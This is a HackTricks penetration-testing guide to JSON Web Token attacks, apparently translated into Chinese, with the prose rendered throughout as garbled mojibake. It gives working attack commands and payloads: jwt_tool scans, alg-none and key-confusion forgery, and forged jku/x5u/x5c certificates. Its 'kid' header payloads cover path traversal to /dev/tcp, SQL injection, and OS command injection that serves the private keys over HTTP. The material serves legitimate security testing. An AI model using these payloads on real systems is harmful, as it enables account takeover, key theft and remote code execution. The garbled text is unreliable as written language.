# JWTæ¼æ´ï¼ˆJson Web Tokensï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**èµé‡‘çŒäººæç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**èµé‡‘çŒäººå¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬çš„[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

**æœ¬æ–‡çš„ä¸€éƒ¨åˆ†å†…å®¹æ¥è‡ªï¼š**[**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**ä¼Ÿå¤§çš„JWTæ¸—é€æµ‹è¯•å·¥å…·çš„ä½œè€…**ï¼š[**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **å¿«é€ŸæˆåŠŸ**

ä½¿ç”¨`All Tests!`æ¨¡å¼è¿è¡Œ[**jwt\_tool**](https://github.com/ticarpi/jwt\_tool)ï¼Œç­‰å¾…å‡ºç°ç»¿è‰²è¡Œ
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
å¦‚æœä½ å¾ˆå¹¸è¿ï¼Œå·¥å…·ä¼šæ‰¾åˆ°ä¸€äº›æƒ…å†µï¼Œå³ç½‘é¡µåº”ç”¨ç¨‹åºåœ¨æ£€æŸ¥JWTæ—¶å‡ºç°é”™è¯¯ï¼š

![](<../.gitbook/assets/image (435).png>)

ç„¶åï¼Œä½ å¯ä»¥åœ¨ä»£ç†ä¸­æœç´¢è¯¥è¯·æ±‚ï¼Œæˆ–ä½¿ç”¨jwt\_toolè½¬å‚¨è¯¥è¯·æ±‚ä½¿ç”¨çš„JWTï¼š
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### åœ¨ä¸ä¿®æ”¹ä»»ä½•å†…å®¹çš„æƒ…å†µä¸‹ç¯¡æ”¹æ•°æ®

ä½ å¯ä»¥åªç¯¡æ”¹æ•°æ®è€Œä¿ç•™ç­¾åï¼Œç„¶åæ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦åœ¨æ£€æŸ¥ç­¾åã€‚å°è¯•å°†ç”¨æˆ·åæ›´æ”¹ä¸º"admin"ã€‚

#### **ä»¤ç‰Œæ˜¯å¦è¢«æ£€æŸ¥ï¼Ÿ**

* å¦‚æœå‡ºç°é”™è¯¯æ¶ˆæ¯ï¼Œåˆ™è¡¨ç¤ºæ­£åœ¨æ£€æŸ¥ç­¾å - é˜…è¯»å¯èƒ½æ³„éœ²æ•æ„Ÿä¿¡æ¯çš„ä»»ä½•è¯¦ç»†é”™è¯¯ä¿¡æ¯ã€‚
* å¦‚æœè¿”å›çš„é¡µé¢ä¸åŒï¼Œåˆ™è¡¨ç¤ºæ­£åœ¨æ£€æŸ¥ç­¾åã€‚
* å¦‚æœé¡µé¢ç›¸åŒï¼Œåˆ™è¡¨ç¤ºæœªæ£€æŸ¥ç­¾å - æ˜¯æ—¶å€™å¼€å§‹ç¯¡æ”¹æœ‰æ•ˆè½½è·å£°æ˜ï¼Œçœ‹çœ‹ä½ èƒ½åšä»€ä¹ˆäº†ï¼

### æ¥æº

æ£€æŸ¥ä»¤ç‰Œåœ¨ä»£ç†çš„è¯·æ±‚å†å²ä¸­çš„æ¥æºã€‚å®ƒåº”è¯¥æ˜¯åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºçš„ï¼Œè€Œä¸æ˜¯åœ¨å®¢æˆ·ç«¯ä¸Šã€‚

* å¦‚æœé¦–æ¬¡å‡ºç°åœ¨å®¢æˆ·ç«¯ï¼Œåˆ™è¡¨ç¤º**å¯†é’¥**å¯ä»¥è¢«å®¢æˆ·ç«¯ä»£ç è®¿é—® - æ‰¾å‡ºå®ƒï¼
* å¦‚æœé¦–æ¬¡å‡ºç°åœ¨æœåŠ¡å™¨ä¸Šï¼Œåˆ™ä¸€åˆ‡æ­£å¸¸ã€‚

### æœ‰æ•ˆæœŸ

æ£€æŸ¥ä»¤ç‰Œæ˜¯å¦æŒç»­æ—¶é—´è¶…è¿‡24å°æ—¶...ä¹Ÿè®¸å®ƒæ°¸ä¸è¿‡æœŸã€‚å¦‚æœæœ‰ä¸€ä¸ª"exp"å­—æ®µï¼Œè¯·æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦æ­£ç¡®å¤„ç†å®ƒã€‚

### æš´åŠ›ç ´è§£HMACå¯†é’¥

[**æŸ¥çœ‹æ­¤é¡µé¢ã€‚**](../generic-methodologies-and-resources/brute-force.md#jwt)

### å°†ç®—æ³•ä¿®æ”¹ä¸ºNone (CVE-2015-9235)

å°†ä½¿ç”¨çš„ç®—æ³•è®¾ç½®ä¸º"None"å¹¶åˆ é™¤ç­¾åéƒ¨åˆ†ã€‚

ä½¿ç”¨Burpæ‰©å±•ç¨‹åº"JSON Web Token"å°è¯•æ­¤æ¼æ´ï¼Œå¹¶æ›´æ”¹JWTä¸­çš„ä¸åŒå€¼ï¼ˆå°†è¯·æ±‚å‘é€åˆ°Repeaterï¼Œåœ¨"JSON Web Token"é€‰é¡¹å¡ä¸­å¯ä»¥ä¿®æ”¹ä»¤ç‰Œçš„å€¼ã€‚æ‚¨è¿˜å¯ä»¥é€‰æ‹©å°†"Alg"å­—æ®µçš„å€¼è®¾ç½®ä¸º"None"ï¼‰ã€‚

### å°†ç®—æ³•ä»RS256ï¼ˆéå¯¹ç§°ï¼‰æ›´æ”¹ä¸ºHS256ï¼ˆå¯¹ç§°ï¼‰(CVE-2016-5431/CVE-2016-10555)

ç®—æ³•HS256ä½¿ç”¨å¯†é’¥å¯¹æ¯ä¸ªæ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯ã€‚\
ç®—æ³•RS256ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚

å¦‚æœå°†ç®—æ³•ä»RS256æ›´æ”¹ä¸ºHS256ï¼Œåˆ™åç«¯ä»£ç å°†ä½¿ç”¨å…¬é’¥ä½œä¸ºå¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•æ¥éªŒè¯ç­¾åã€‚

ç„¶åï¼Œä½¿ç”¨å…¬é’¥å¹¶å°†RS256æ›´æ”¹ä¸ºHS256ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæœ‰æ•ˆçš„ç­¾åã€‚æ‚¨å¯ä»¥é€šè¿‡æ‰§è¡Œä»¥ä¸‹æ“ä½œæ£€ç´¢WebæœåŠ¡å™¨çš„è¯ä¹¦ï¼š
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### åœ¨å¤´éƒ¨æ’å…¥æ–°çš„å…¬é’¥

æ”»å‡»è€…åœ¨ä»¤ç‰Œçš„å¤´éƒ¨æ’å…¥ä¸€ä¸ªæ–°çš„å¯†é’¥ï¼ŒæœåŠ¡å™¨ä½¿ç”¨è¿™ä¸ªæ–°çš„å¯†é’¥æ¥éªŒè¯ç­¾åï¼ˆCVE-2018-0114ï¼‰ã€‚

å¯ä»¥ä½¿ç”¨"JSON Web Tokens" Burpæ‰©å±•æ¥å®ç°è¿™ä¸€ç‚¹ã€‚\
ï¼ˆå°†è¯·æ±‚å‘é€åˆ°Repeaterï¼Œåœ¨JSON Web Tokené€‰é¡¹å¡ä¸­é€‰æ‹©"CVE-2018-0114"å¹¶å‘é€è¯·æ±‚ï¼‰ã€‚

### JWKSæ¬ºéª—

å¦‚æœä»¤ç‰Œä½¿ç”¨äº†â€œjkuâ€å¤´å£°æ˜ï¼Œè¯·æŸ¥çœ‹æä¾›çš„URLã€‚è¿™ä¸ªURLåº”è¯¥æŒ‡å‘ä¸€ä¸ªåŒ…å«ç”¨äºéªŒè¯ä»¤ç‰Œçš„å…¬é’¥çš„JWKSæ–‡ä»¶ã€‚ç¯¡æ”¹ä»¤ç‰Œï¼Œå°†jkuå€¼æŒ‡å‘ä¸€ä¸ªä½ å¯ä»¥ç›‘è§†æµé‡çš„WebæœåŠ¡ã€‚

å¦‚æœä½ å¾—åˆ°äº†ä¸€ä¸ªHTTPäº¤äº’ï¼Œé‚£ä¹ˆä½ ç°åœ¨çŸ¥é“æœåŠ¡å™¨æ­£åœ¨å°è¯•ä»ä½ æä¾›çš„URLåŠ è½½å¯†é’¥ã€‚_ä½¿ç”¨jwt_toolçš„-Sæ ‡å¿—å’Œ-u_ [_http://example.com_](http://example.com) _å‚æ•°ä¸€èµ·ç”Ÿæˆä¸€ä¸ªæ–°çš„å¯†é’¥å¯¹ï¼Œæ³¨å…¥ä½ æä¾›çš„URLï¼Œç”Ÿæˆä¸€ä¸ªåŒ…å«å…¬é’¥çš„JWKSï¼Œå¹¶ç”¨ç§é’¥ç­¾åä»¤ç‰Œ_

### Kidé—®é¢˜

`kid`æ˜¯ä¸€ä¸ªå¯é€‰çš„å¤´å£°æ˜ï¼Œç”¨äºä¿å­˜å¯†é’¥æ ‡è¯†ç¬¦ï¼Œå½“ä½ æœ‰å¤šä¸ªå¯†é’¥ç”¨äºç­¾ç½²ä»¤ç‰Œæ—¶ï¼Œä½ éœ€è¦æŸ¥æ‰¾æ­£ç¡®çš„å¯†é’¥æ¥éªŒè¯ç­¾åã€‚

#### "kid"é—®é¢˜ - æ³„éœ²å¯†é’¥

å¦‚æœå¤´éƒ¨ä½¿ç”¨äº†"kid"å£°æ˜ï¼Œè¯·æ£€æŸ¥è¯¥æ–‡ä»¶æˆ–å…¶å˜ä½“æ˜¯å¦å­˜åœ¨äºWebç›®å½•ä¸­ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ`"kid":"key/12345"`ï¼Œåˆ™æŸ¥æ‰¾_web root_ ä¸­çš„ _/key/12345_ å’Œ _/key/12345.pem_ã€‚

#### "kid"é—®é¢˜ - è·¯å¾„éå†

å¦‚æœå¤´éƒ¨ä½¿ç”¨äº†"kid"å£°æ˜ï¼Œè¯·æ£€æŸ¥æ˜¯å¦å¯ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨ä¸åŒçš„æ–‡ä»¶ã€‚é€‰æ‹©ä¸€ä¸ªä½ å¯èƒ½èƒ½å¤Ÿé¢„æµ‹å†…å®¹çš„æ–‡ä»¶ï¼Œæˆ–è€…å°è¯•`"kid":"/dev/tcp/yourIP/yourPort"`æ¥æµ‹è¯•è¿æ¥æ€§ï¼Œç”šè‡³ä¸€äº›**SSRF**è½½è·...\
_ä½¿ç”¨jwt_toolçš„-Tæ ‡å¿—æ¥ç¯¡æ”¹JWTå¹¶æ›´æ”¹kidå£°æ˜çš„å€¼ï¼Œç„¶åé€‰æ‹©ä¿ç•™åŸå§‹ç­¾å_
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
ä½¿ç”¨å·²çŸ¥å†…å®¹çš„ä¸»æœºå†…çš„æ–‡ä»¶ï¼Œæ‚¨è¿˜å¯ä»¥ä¼ªé€ ä¸€ä¸ªæœ‰æ•ˆçš„JWTã€‚ä¾‹å¦‚ï¼Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶`/proc/sys/kernel/randomize_va_space`çš„å€¼è®¾ç½®ä¸º**2**ã€‚å› æ­¤ï¼Œå°†è¯¥**è·¯å¾„**æ”¾å…¥â€œ**kid**â€å‚æ•°ä¸­ï¼Œå¹¶ä½¿ç”¨â€œ**2**â€ä½œä¸º**å¯¹ç§°å¯†ç **ç”ŸæˆJWTï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿç”Ÿæˆä¸€ä¸ªæœ‰æ•ˆçš„æ–°JWTã€‚

#### "kid"é—®é¢˜ - SQLæ³¨å…¥

åœ¨å°†â€œkidâ€çš„å†…å®¹ç”¨äºä»æ•°æ®åº“ä¸­æ£€ç´¢å¯†ç çš„åœºæ™¯ä¸­ï¼Œæ‚¨å¯ä»¥å°†â€œkidâ€å‚æ•°ä¸­çš„æœ‰æ•ˆè´Ÿè½½æ›´æ”¹ä¸ºï¼š`non-existent-index' UNION SELECT 'ATTACKER';-- -`ï¼Œç„¶åä½¿ç”¨ç§˜å¯†å¯†é’¥`ATTACKER`ç­¾ç½²JWTã€‚

#### "kid"é—®é¢˜ - OSæ³¨å…¥

åœ¨â€œkidâ€å‚æ•°åŒ…å«æŒ‡å‘åŒ…å«å¯†é’¥çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œå¹¶ä¸”æ­¤è·¯å¾„æ­£åœ¨**æ‰§è¡Œçš„å‘½ä»¤**ä¸­ä½¿ç”¨æ—¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½è·å¾—RCEå¹¶å…¬å¼€ç§é’¥ï¼š`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### æ‚é¡¹æ”»å‡»

ä»¥ä¸‹æ˜¯å·²çŸ¥çš„åº”è¿›è¡Œæµ‹è¯•çš„å¼±ç‚¹ã€‚

**è·¨æœåŠ¡ä¸­ç»§æ”»å‡»**

æŸäº›Webåº”ç”¨ç¨‹åºä½¿ç”¨å—ä¿¡ä»»çš„JWTâ€œæœåŠ¡â€ä¸ºå…¶ç”Ÿæˆå’Œç®¡ç†ä»¤ç‰Œã€‚è¿‡å»æ›¾å‘ç”Ÿè¿‡è¿™æ ·çš„æƒ…å†µï¼Œå³ä¸ºJWTæœåŠ¡çš„ä¸€ä¸ªå®¢æˆ·ç«¯ç”Ÿæˆçš„ä»¤ç‰Œå®é™…ä¸Šå¯ä»¥è¢«è¯¥æœåŠ¡çš„å¦ä¸€ä¸ªå®¢æˆ·ç«¯æ¥å—ã€‚\
å¦‚æœæ‚¨è§‚å¯Ÿåˆ°JWTé€šè¿‡ç¬¬ä¸‰æ–¹æœåŠ¡å‘å‡ºæˆ–æ›´æ–°ï¼Œåˆ™å€¼å¾—ç¡®å®šæ˜¯å¦å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ç”¨æˆ·å/ç”µå­é‚®ä»¶åœ¨è¯¥æœåŠ¡çš„å¦ä¸€ä¸ªå®¢æˆ·ç«¯ä¸Šæ³¨å†Œå¸æˆ·ã€‚å¦‚æœå¯ä»¥ï¼Œè¯·å°è¯•å°†è¯¥ä»¤ç‰Œé‡æ”¾åˆ°ç›®æ ‡è¯·æ±‚ä¸­ã€‚å®ƒæ˜¯å¦è¢«æ¥å—ï¼Ÿ

* å¦‚æœæ‚¨çš„ä»¤ç‰Œè¢«æ¥å—ï¼Œåˆ™å¯èƒ½å­˜åœ¨ä¸€ä¸ªå…³é”®é—®é¢˜ï¼Œå…è®¸æ‚¨ä¼ªé€ ä»»ä½•ç”¨æˆ·çš„å¸æˆ·ã€‚ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨æ­£åœ¨ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºä¸Šæ³¨å†Œï¼Œæ‚¨å¯èƒ½éœ€è¦å¯»æ±‚æ›´å¹¿æ³›çš„æµ‹è¯•æƒé™ä»¥é˜²æ­¢è¿›å…¥æ³•å¾‹ç°è‰²åœ°å¸¦ï¼

**æ˜¯å¦æ£€æŸ¥expï¼Ÿ**

â€œexpâ€è´Ÿè½½å£°æ˜ç”¨äºæ£€æŸ¥ä»¤ç‰Œçš„åˆ°æœŸæ—¶é—´ã€‚ç”±äºJWTé€šå¸¸åœ¨ç¼ºå°‘ä¼šè¯ä¿¡æ¯çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œå› æ­¤éœ€è¦å°å¿ƒå¤„ç†å®ƒä»¬-åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ•è·å’Œé‡æ”¾ä»–äººçš„JWTå°†å…è®¸æ‚¨å†’å……è¯¥ç”¨æˆ·ã€‚\
JWTé‡æ”¾æ”»å‡»çš„ä¸€ç§ç¼“è§£æªæ–½ï¼ˆç”±JWT RFCå»ºè®®ï¼‰æ˜¯ä½¿ç”¨â€œexpâ€å£°æ˜ä¸ºä»¤ç‰Œè®¾ç½®åˆ°æœŸæ—¶é—´ã€‚è¿˜é‡è¦çš„æ˜¯åœ¨åº”ç”¨ç¨‹åºä¸­è®¾ç½®ç›¸å…³æ£€æŸ¥ï¼Œä»¥ç¡®ä¿å¤„ç†æ­¤å€¼å¹¶åœ¨ä»¤ç‰Œè¿‡æœŸæ—¶æ‹’ç»ä»¤ç‰Œã€‚å¦‚æœä»¤ç‰ŒåŒ…å«â€œexpâ€å£°æ˜å¹¶ä¸”æµ‹è¯•æ—¶é—´é™åˆ¶å…è®¸ï¼Œè¯·å°è¯•å­˜å‚¨ä»¤ç‰Œå¹¶åœ¨è¿‡æœŸæ—¶é—´è¿‡å»åé‡æ”¾å®ƒã€‚_ä½¿ç”¨jwt\_toolçš„-Ræ ‡å¿—è¯»å–ä»¤ç‰Œçš„å†…å®¹ï¼Œå…¶ä¸­åŒ…æ‹¬æ—¶é—´æˆ³è§£æå’Œåˆ°æœŸæ£€æŸ¥ï¼ˆæ—¶é—´æˆ³ä¸ºUTCï¼‰_

* å¦‚æœä»¤ç‰Œä»ç„¶åœ¨åº”ç”¨ç¨‹åºä¸­éªŒè¯ï¼Œåˆ™å¯èƒ½å­˜åœ¨å®‰å…¨é£é™©ï¼Œå› ä¸ºä»¤ç‰Œå¯èƒ½æ°¸è¿œä¸ä¼šè¿‡æœŸã€‚

### x5uå’Œjku

#### jku

jkuä»£è¡¨**JWK Set URL**ã€‚\
å¦‚æœä»¤ç‰Œä½¿ç”¨â€œ**jku**â€**å¤´**å£°æ˜ï¼Œåˆ™**æ£€æŸ¥æä¾›çš„URL**ã€‚è¿™åº”è¯¥æŒ‡å‘åŒ…å«ç”¨äºéªŒè¯ä»¤ç‰Œçš„å…¬é’¥çš„JWKSæ–‡ä»¶çš„URLã€‚ç¯¡æ”¹ä»¤ç‰Œä»¥å°†jkuå€¼æŒ‡å‘æ‚¨å¯ä»¥ç›‘è§†æµé‡çš„WebæœåŠ¡ã€‚é¦–å…ˆï¼Œæ‚¨éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ–°ç§é’¥å’Œå…¬é’¥çš„æ–°è¯ä¹¦ã€‚
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[**jwt.io**](https://jwt.io)æ¥ä½¿ç”¨**åˆ›å»ºçš„å…¬é’¥å’Œç§é’¥ï¼Œå¹¶å°†å‚æ•°jkuæŒ‡å‘åˆ›å»ºçš„è¯ä¹¦**æ¥åˆ›å»ºæ–°çš„JWTã€‚ä¸ºäº†åˆ›å»ºæœ‰æ•ˆçš„jkuè¯ä¹¦ï¼Œæ‚¨å¯ä»¥ä¸‹è½½åŸå§‹è¯ä¹¦å¹¶æ›´æ”¹æ‰€éœ€çš„å‚æ•°ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ä»å…¬å…±è¯ä¹¦ä¸­è·å–å‚æ•°"e"å’Œ"n"ï¼š
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URLã€‚æŒ‡å‘ä¸€ç»„ä»¥PEMæ ¼å¼ç¼–ç çš„X.509ï¼ˆè¯ä¹¦æ ¼å¼æ ‡å‡†ï¼‰å…¬å…±è¯ä¹¦çš„URIã€‚è¯¥ç»„ä¸­çš„ç¬¬ä¸€ä¸ªè¯ä¹¦å¿…é¡»æ˜¯ç”¨äºç­¾ç½²æ­¤JWTçš„è¯ä¹¦ã€‚éšåçš„è¯ä¹¦ä¾æ¬¡ç­¾ç½²å‰ä¸€ä¸ªè¯ä¹¦ï¼Œä»è€Œå®Œæˆè¯ä¹¦é“¾ã€‚X.509åœ¨RFC 52807ä¸­å®šä¹‰ã€‚éœ€è¦ä½¿ç”¨ä¼ è¾“å®‰å…¨æ€§æ¥ä¼ è¾“è¯ä¹¦ã€‚

å°è¯•å°†æ­¤æ ‡å¤´æ›´æ”¹ä¸ºæ‚¨æ§åˆ¶çš„URLï¼Œå¹¶æ£€æŸ¥æ˜¯å¦æ”¶åˆ°ä»»ä½•è¯·æ±‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ç¯¡æ”¹JWTã€‚

è¦ä½¿ç”¨æ‚¨æ§åˆ¶çš„è¯ä¹¦ä¼ªé€ ä¸€ä¸ªæ–°çš„ä»¤ç‰Œï¼Œæ‚¨éœ€è¦åˆ›å»ºè¯ä¹¦å¹¶æå–å…¬é’¥å’Œç§é’¥ï¼š
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
ç„¶åï¼Œä½ å¯ä»¥ä½¿ç”¨ä¾‹å¦‚ [**jwt.io**](https://jwt.io) æ¥ä½¿ç”¨**åˆ›å»ºçš„å…¬é’¥å’Œç§é’¥ï¼Œå¹¶å°†å‚æ•° x5u æŒ‡å‘åˆ›å»ºçš„è¯ä¹¦ .crt** æ¥åˆ›å»ºæ–°çš„ JWTã€‚

![](<../.gitbook/assets/image (439).png>)

ä½ è¿˜å¯ä»¥æ»¥ç”¨è¿™ä¸¤ä¸ªæ¼æ´**ç”¨äº SSRF æ”»å‡»**ã€‚

#### x5c

è¯¥å‚æ•°å¯ä»¥åŒ…å«**ä»¥ base64 ç¼–ç çš„è¯ä¹¦**ï¼š

![](<../.gitbook/assets/image (440).png>)

å¦‚æœæ”»å‡»è€…**ç”Ÿæˆäº†è‡ªç­¾åè¯ä¹¦**ï¼Œå¹¶ä½¿ç”¨ç›¸åº”çš„ç§é’¥åˆ›å»ºäº†ä¼ªé€ çš„ä»¤ç‰Œï¼Œå¹¶å°† "x5c" å‚æ•°çš„å€¼æ›¿æ¢ä¸ºæ–°ç”Ÿæˆçš„è¯ä¹¦ï¼Œå¹¶ä¿®æ”¹å…¶ä»–å‚æ•°ï¼Œå³ nã€e å’Œ x5tï¼Œé‚£ä¹ˆä¼ªé€ çš„ä»¤ç‰Œå°†è¢«æœåŠ¡å™¨æ¥å—ã€‚
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### åµŒå…¥å…¬é’¥ï¼ˆCVE-2018-0114ï¼‰

å¦‚æœJWTä¸­åµŒå…¥äº†å…¬é’¥ï¼Œå°±åƒä¸‹é¢çš„åœºæ™¯ä¸€æ ·ï¼š

![](<../.gitbook/assets/image (438).png>)

ä½¿ç”¨ä»¥ä¸‹Node.jsè„šæœ¬å¯ä»¥ä»è¯¥æ•°æ®ç”Ÿæˆå…¬é’¥ï¼š
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
å¯ä»¥ç”Ÿæˆæ–°çš„ç§é’¥/å…¬é’¥ï¼Œå°†æ–°çš„å…¬é’¥åµŒå…¥ä»¤ç‰Œä¸­ï¼Œå¹¶ä½¿ç”¨å®ƒç”Ÿæˆæ–°çš„ç­¾åï¼š
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹Node.jsè„šæœ¬è·å–â€œnâ€å’Œâ€œeâ€ï¼š
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
æœ€åï¼Œä½¿ç”¨å…¬é’¥å’Œç§é’¥ä»¥åŠæ–°çš„â€œnâ€å’Œâ€œeâ€å€¼ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[jwt.io](https://jwt.io)ä¼ªé€ ä¸€ä¸ªåŒ…å«ä»»ä½•ä¿¡æ¯çš„æ–°æœ‰æ•ˆJWTã€‚

### JTIï¼ˆJWT IDï¼‰

JTIï¼ˆJWT IDï¼‰å£°æ˜ä¸ºJWTä»¤ç‰Œæä¾›äº†ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ã€‚å®ƒå¯ä»¥ç”¨äºé˜²æ­¢ä»¤ç‰Œè¢«é‡æ”¾ã€‚\
ç„¶è€Œï¼Œæƒ³è±¡ä¸€ç§æƒ…å†µï¼ŒIDçš„æœ€å¤§é•¿åº¦ä¸º4ï¼ˆ0001-9999ï¼‰ã€‚è¯·æ±‚0001å’Œ10001å°†ä½¿ç”¨ç›¸åŒçš„IDã€‚å› æ­¤ï¼Œå¦‚æœåç«¯åœ¨æ¯ä¸ªè¯·æ±‚ä¸Šé€’å¢IDï¼Œæ‚¨å¯ä»¥æ»¥ç”¨æ­¤åŠŸèƒ½æ¥**é‡æ”¾è¯·æ±‚**ï¼ˆéœ€è¦åœ¨æ¯æ¬¡æˆåŠŸé‡æ”¾ä¹‹é—´å‘é€10000ä¸ªè¯·æ±‚ï¼‰ã€‚

### JWTæ³¨å†Œå£°æ˜

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### å·¥å…·

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
